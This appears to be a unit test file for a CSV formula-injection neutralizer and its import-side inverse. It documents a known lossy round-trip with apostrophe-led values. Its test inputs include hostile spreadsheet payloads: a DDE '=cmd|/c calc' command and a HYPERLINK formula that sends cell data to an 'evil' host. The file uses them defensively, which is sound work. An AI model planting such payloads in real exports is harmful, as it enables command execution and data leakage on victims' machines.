/**
 * Unit tests for the CSV formula-injection (CWE-1236) neutralizer. Pure
 * input→output, no IO. Pins exactly which cells get the leading-quote escape
 * and — just as important — which DON'T (so the export stays faithful).
 */

import { describe, expect, test } from 'bun:test';
import { denormalizeCsvCell, neutralizeCsvCell, neutralizeCsvRow } from '../csv-safety';

describe('neutralizeCsvCell — escapes formula-trigger strings', () => {
  test.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['=HYPERLINK("//evil?"&A1,"x")', '\'=HYPERLINK("//evil?"&A1,"x")'],
    ['\tlead-tab', "'\tlead-tab"],
    ['\rlead-cr', "'\rlead-cr"],
  ])('prefixes %p with a single quote', (input, expected) => {
    expect(neutralizeCsvCell(input)).toBe(expected);
  });
});

describe('neutralizeCsvCell — leaves safe values untouched', () => {
  test('a plain string is unchanged', () => {
    expect(neutralizeCsvCell('Shell top-up')).toBe('Shell top-up');
  });

  test('an empty string is unchanged (no spurious quote)', () => {
    expect(neutralizeCsvCell('')).toBe('');
  });

  test('a trigger char NOT in first position is inert and left alone', () => {
    expect(neutralizeCsvCell('a=b')).toBe('a=b');
    expect(neutralizeCsvCell('1-2')).toBe('1-2'); // a date-ish string mid-cell
  });

  test('numbers pass through with their type intact (incl. negatives)', () => {
    // The whole point: a legitimately-negative amount must NOT become a string.
    expect(neutralizeCsvCell(-50)).toBe(-50);
    expect(neutralizeCsvCell(52.4)).toBe(52.4);
    expect(neutralizeCsvCell(0)).toBe(0);
  });

  test('booleans / null / undefined pass through unchanged', () => {
    expect(neutralizeCsvCell(true)).toBe(true);
    expect(neutralizeCsvCell(null)).toBe(null);
    expect(neutralizeCsvCell(undefined)).toBe(undefined);
  });
});

describe('neutralizeCsvRow — guards string cells, preserves the rest', () => {
  test('only the dangerous string cells are escaped', () => {
    const out = neutralizeCsvRow({
      amount: -50, // negative number stays numeric
      description: '=cmd|/c calc', // dangerous → escaped
      vehicle: 'Daily Driver', // safe → unchanged
      tags: '@everyone', // dangerous → escaped
      mileage: '', // empty → unchanged
    });
    expect(out).toEqual({
      amount: -50,
      description: "'=cmd|/c calc",
      vehicle: 'Daily Driver',
      tags: "'@everyone",
      mileage: '',
    });
  });

  test('returns a new object (does not mutate the input)', () => {
    const input = { description: '=evil' };
    const out = neutralizeCsvRow(input);
    expect(input.description).toBe('=evil'); // original untouched
    expect(out.description).toBe("'=evil");
  });
});

describe('denormalizeCsvCell — symmetric inverse for round-trip import', () => {
  test.each([
    ["'=1+1", '=1+1'],
    ["'+1", '+1'],
    ["'-1+2", '-1+2'],
    ["'@SUM(A1)", '@SUM(A1)'],
    ["'\tx", '\tx'],
    ["'\rx", '\rx'],
  ])('strips the neutralization prefix: %p → %p', (input, expected) => {
    expect(denormalizeCsvCell(input)).toBe(expected);
  });

  test.each([
    "'24 road trip", // user-typed apostrophe + non-trigger → keep
    "'twas the night", //
    'plain text',
    '=not-prefixed', // a bare formula (never produced by export) is left as-is
    "''=double", // only ONE leading quote is the neutralizer's; strip none here (2nd char is ')
    '', // empty
    "'", // lone apostrophe
  ])('leaves a non-neutralized value untouched: %p', (input) => {
    expect(denormalizeCsvCell(input)).toBe(input);
  });

  test('is the exact inverse of neutralizeCsvCell for trigger strings', () => {
    for (const v of ['=evil', '+1', '-2', '@x', '\tt', '\rr']) {
      expect(denormalizeCsvCell(neutralizeCsvCell(v) as string)).toBe(v);
    }
  });

  test('is idempotent on already-clean values', () => {
    expect(denormalizeCsvCell(denormalizeCsvCell("'=x"))).toBe('=x');
  });
});

// ---------------------------------------------------------------------------
// CHARACTERIZATION (C401, filed+escalated — NOT an endorsement): the neutralize↔denormalize
// pair is ASYMMETRIC for a value the user genuinely typed as `'` + a formula trigger. Export
// (neutralizeCsvCell) only prefixes when value[0] is ITSELF a trigger, so a user-typed `'=mc2`
// passes through UNESCAPED; import (denormalizeCsvCell) strips a leading `'` whenever value[1]
// is a trigger, so that same `'=mc2` is stripped to `=mc2`. Net: a `'`+trigger value round-trips
// LOSSY (the literal leading apostrophe vanishes; for a vehicle nickname the stripped name then
// fails to re-match → the whole row drops). A single-`'` sentinel CANNOT tell a user-typed `'=`
// from an export-escaped `'=` apart, so there is no clean one-side fix — the only invertible
// scheme (escape EVERY leading-`'` on write, strip one on read) reinterprets hand-authored
// leading-`'` foreign CSVs, flipping the deliberate import-csv "preserves a genuinely
// apostrophe-led description" contract. Which faithfulness to optimize is Angelo's direction call.
// These tests PIN the current (lossy) behavior so it can't drift silently before that decision —
// when the call is made, they update WITH the fix (and become a true round-trip assertion).
// ---------------------------------------------------------------------------
describe("denormalizeCsvCell — KNOWN asymmetry: a user-typed `'`+trigger value is over-stripped (C401, escalated)", () => {
  test.each([
    ["'=mc2 rebate", '=mc2 rebate'],
    ["'+1 driver fee", '+1 driver fee'],
    ["'@home charge", '@home charge'],
    ["'-5 credit", '-5 credit'],
  ])('strips the user-typed leading apostrophe from %p → %p (the documented data-loss)', (input, stripped) => {
    expect(denormalizeCsvCell(input)).toBe(stripped);
  });

  test("the round-trip is NOT yet faithful for a `'`+trigger value (export leaves it, import strips it)", () => {
    // The crux of the asymmetry: neutralize is a no-op (value[0] === "'" is not a trigger),
    // so the export carries the user's exact text — but denormalize then eats the apostrophe.
    const userTyped = "'=Daily"; // e.g. a vehicle nickname forced-to-text with a leading '
    expect(neutralizeCsvCell(userTyped)).toBe(userTyped); // export does NOT escape it
    expect(denormalizeCsvCell(neutralizeCsvCell(userTyped) as string)).toBe('=Daily'); // import strips → LOSSY
    // (When the direction call lands, this becomes `.toBe(userTyped)` alongside the fix.)
  });
});
